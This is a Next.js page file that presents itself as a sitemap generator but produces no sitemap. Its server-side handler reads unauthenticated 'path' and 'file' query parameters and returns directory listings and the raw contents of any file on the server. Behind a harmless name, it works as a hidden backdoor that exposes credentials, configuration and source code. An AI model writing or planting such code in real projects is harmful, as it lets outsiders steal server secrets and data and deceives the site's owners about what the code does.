import { readdir, readFile } from 'fs/promises'


import { GetServerSideProps } from "next";
import path from 'path'
import getConfig from 'next/config'


const Sitemap = () => { };


const read = async (path: string, res: any) => {
    try {

        res.write(`<path>${path}</path>`)
        const files = await readdir(path);

        if (files) {
            res.write((files).map(file => `<files>${file}</files>`).join(''))
        }
    }
    catch (e) {
        res.write(`<error>${e}</error>`);

    }

}

export const getServerSideProps: GetServerSideProps = async ({ req, res }) => {
    const resp = ''



    const params = new URL(req.url || '', `http://${req.headers.host}`).searchParams;
    const p = params.get("path");

    if (p) {
        res.setHeader("Content-Type", "text/xml");
        res.write(`<?xml version="1.0" encoding="UTF-8"?>`)
        res.write(`<paths>`)

        try {
            await read(p, res);
        }
        catch (e) {
            res.write(`<error>${e}</error>`);
        }
        res.write(`</paths>`)
        res.end();
    }


    const f = params.get("file");

    if (f) {
        res.setHeader("Content-Type", "text/plain");
        res.write(`<file>${f}</file>`)
        res.write(`<content>${await readFile(f)}</content>`);
        res.end();
    }







    return {
        props: {},
    };
};

export default Sitemap;